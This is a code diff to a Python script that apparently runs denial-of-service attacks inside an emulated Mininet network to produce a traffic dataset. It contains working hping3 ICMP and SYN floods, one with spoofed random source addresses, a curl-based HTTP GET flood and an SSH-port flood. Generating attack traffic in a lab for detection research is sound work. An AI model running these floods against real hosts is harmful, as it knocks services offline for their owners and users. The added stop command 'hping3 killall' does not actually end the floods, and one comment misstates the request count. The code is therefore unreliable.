@@ -15,7 +15,8 @@ def icmp_flood(net):
         dst = net.get(dst_name)
         
         src.cmd(f'hping3 --icmp -c 5000 --flood  {dst.IP()} &') #we gonna send 5000 packets of icmp request using hping3 
-        
+        time.sleep(5)
+        src.cmd('hping3 killall')
         
         
 def SYN_FLOOD(net):
@@ -30,7 +31,8 @@ def SYN_FLOOD(net):
     src.cmd(f'ping -c 3   {dst.IP()}') #First of all the attacker ping the victim 
 
     src.cmd(f'hping3  -S {dst.IP()} --flood --rand-source &') #we gonna use hping3  and the rand-source command will do what we call AN IP SPOOFING
-    
+    time.sleep(5)
+    src.cmd('hping3 killall')
     
     
 def HTTP_GETFLOOD(net):
@@ -40,6 +42,8 @@ def HTTP_GETFLOOD(net):
     
     src.cmd('for i in {1..8000}; do curl -s http://10.0.0.2:8080 > /dev/null; done &')  
     # this command is used to run a get method 80000 times ignoring the return text
+    time.sleep(5)
+    src.cmd('hping3 killall')
     
     
     
@@ -53,11 +57,13 @@ def ssh_flood(net):
             dst = net.get(dst_name)
     
     src.cmd(f'hping3 -S -p 22 --flood {dst.IP()} &') #attacking the 22 port in tcp 
+    time.sleep(5)
+    src.cmd('hping3 killall')
     
     
     
             
-    
+    #added a timer to collect the data for the dataset and kill the attacks 
 
     
     
